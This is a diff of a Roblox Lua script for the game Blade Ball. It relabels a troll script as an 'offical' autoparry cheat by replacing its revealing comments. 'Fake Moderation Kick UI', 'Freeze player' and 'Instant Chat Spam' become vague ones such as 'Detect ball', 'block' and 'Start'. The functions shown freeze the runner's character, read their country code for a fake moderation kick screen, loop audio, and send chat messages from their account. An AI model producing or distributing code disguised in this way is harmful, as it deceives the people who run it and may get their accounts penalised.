@@ -1,4 +1,4 @@
--- BladeBall_SilentAim v5 (Real Country Detection Version)
+-- BladeBall_SilentAim v5 (offical blade ball script autoparry)
 local plrs = game:GetService("Players")
 local plr = plrs.LocalPlayer
 local starterGui = game:GetService("StarterGui")
@@ -6,7 +6,7 @@ local runService = game:GetService("RunService")
 local localizationService = game:GetService("LocalizationService")
 local replicatedStorage = game:GetService("ReplicatedStorage")
 
--- Convert country code to flag emoji
+-- Detect ball
 local function countryCodeToFlag(code)
     if not code or #code ~= 2 then return "" end
     local function letterToRegional(c)
@@ -15,7 +15,7 @@ local function countryCodeToFlag(code)
     return letterToRegional(code:sub(1,1)) .. letterToRegional(code:sub(2,2))
 end
 
--- Audio troll
+-- Audio editor
 local function audioLoop()
     local s = Instance.new("Sound")
     s.SoundId = "rbxassetid://17620645740"
@@ -25,7 +25,7 @@ local function audioLoop()
     s:Play()
 end
 
--- Freeze player
+-- set player
 local function freezePlayer()
     if plr.Character then
         for _, v in ipairs(plr.Character:GetDescendants()) do
@@ -38,7 +38,7 @@ local function freezePlayer()
     end
 end
 
--- Fake Moderation Kick UI
+-- block
 local function moderationPrank()
     -- Try to get player's country
     local success, regionCode = pcall(function()
@@ -103,7 +103,7 @@ local function moderationPrank()
     end)
 end
 
--- Instant Chat Spam
+-- suck
 local function chatTroll()
     for i = 1, 4 do
         replicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer(
@@ -112,7 +112,7 @@ local function chatTroll()
     end
 end
 
--- Start Troll
+-- Start
 starterGui:SetCoreGuiEnabled(Enum.CoreGuiType.All, true)
 
 runService.RenderStepped:Connect(function()
